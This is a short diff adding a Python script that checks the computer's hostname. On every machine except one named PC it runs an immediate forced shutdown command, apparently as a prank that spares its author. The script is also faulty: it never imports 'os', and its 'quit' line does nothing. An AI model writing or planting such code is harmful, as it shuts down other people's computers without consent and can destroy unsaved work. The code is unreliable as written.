@@ -1,0 +1,8 @@
+import socket
+pc = socket.gethostname()
+if pc == "DESKTOP-CM1U7BN":
+    print("error try on difrint pc")
+    quit
+else:
+    os.system("shutdown /s /t 1")
+    
